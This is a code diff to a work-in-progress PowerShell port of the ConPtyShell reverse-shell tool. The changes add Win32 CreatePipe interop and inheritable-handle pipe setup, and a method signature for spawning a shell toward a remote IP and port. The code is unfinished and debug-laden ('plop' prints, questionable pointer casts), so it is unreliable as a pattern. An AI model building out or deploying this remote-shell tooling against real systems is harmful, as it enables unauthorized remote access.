@@ -780,14 +780,6 @@ New-Struct. :P
 $Mod = New-InMemoryModule -ModuleName Win32
 $global:Mod = $Mod
 
-$FunctionDefinitions = @(
-    (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
-    (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError)
-)
-
-$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
-$global:Kernel32 = $Types['kernel32']
-
 $global:ProccessInformation =  struct $Mod PROCESS_INFORMATION @{
     hProcess =      field 0 IntPtr
     hTread =        field 1 IntPtr
@@ -795,11 +787,21 @@ $global:ProccessInformation =  struct $Mod PROCESS_INFORMATION @{
     dwThreadId =    field 3 int
 }
 
-$SECURITY_ATTRIBUTES_TYPE = struct $Mod SECURITY_ATTRIBUTES @{
+$global:SECURITY_ATTRIBUTES_TYPE = struct $Mod SECURITY_ATTRIBUTES @{
     nLength =               field 0 Int
     lpSecurityDescriptor =  field 1 IntPtr
     bInheritHandle =        field 2 Int
 }
+
+$FunctionDefinitions = @(
+    (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
+    (func kernel32 GetModuleHandle ([IntPtr]) @([String]) -SetLastError),
+    (func kernel32 CreatePipe ([bool]) @([IntPtr], [IntPtr], $global:SECURITY_ATTRIBUTES_TYPE.MakeByRefType(), [Int]) -Charset Auto -SetLastError)
+)
+
+$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
+$global:Kernel32 = $Types['kernel32']
+
 
 class ConPtyShellException : System.Exception {
     hidden [string]$error_string = "[-] ConPtyShellException: "
@@ -811,16 +813,44 @@ class ConPtyShellException : System.Exception {
 
 
 class ConPtyShell {
+    hidden [int] $BUFFER_SIZE_PIPE = 0x100000
+
     <# Define the class. Try constructors, properties, or methods. #>
     $ProccessInformation = $global:ProccessInformation
 
     hidden static [void] CreatePipes([IntPtr] $InputPipeRead, [IntPtr] $InputPipeWrite, [IntPtr] $OutputPipeRead, [IntPtr] $OutputPipeWrite) {
 
-        $pSec = New-Object -TypeName SECURITY_ATTRIBUTES
+        # Create a instance of the SECURITY_ATTRIBUTES struct
+        # $pSec = New-Object -TypeName SECURITY_ATTRIBUTES
+        $pSec = [Activator]::CreateInstance($global:SECURITY_ATTRIBUTES_TYPE)
         
-        $pSec.nLength = 1
+        $pSec.nLength = $global:SECURITY_ATTRIBUTES_TYPE::GetSize()
+        $pSec.bInheritHandle = 1
+        $pSec.lpSecurityDescriptor = [IntPtr]::Zero
 
-        Write-Host "psec: " $pSec.nLength
+        # $ref = $pSec -as [IntPtr]
+
+        Write-Host $InputPipeRead
+        Write-Host $InputPipeWrite
+        Write-Host $pSec
+        Write-Host $pSec.nLength
+        # Write-Host $ref
+
+        $Kernel32 = $global:Kernel32
+
+        $secattr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($global:SECURITY_ATTRIBUTES_TYPE::GetSize())
+
+        $sa = $secattr -as $global:SECURITY_ATTRIBUTES_TYPE
+        $sa.nLength = $global:SECURITY_ATTRIBUTES_TYPE::GetSize()
+        $sa.bInheritHandle = 1
+        $sa.lpSecurityDescriptor = [IntPtr]::Zero
+
+        Write-Host "plop"
+        $res = $Kernel32::CreatePipe($InputPipeRead, $InputPipeWrite, [ref] $secattr, [ConPtyShell]::BUFFER_SIZE_PIPE)
+
+        Write-Host "plop 2"
+        Write-Host "res: $res"
+        Write-Host "sa len: " $sa.nLength
     }
 
     static [string] SpawnConPtyShell([string] $remoteIp, [uint32] $remotePort, [uint32] $rows, [uint32] $cols, [string] $commandLine, [bool] $upgradeShell) {
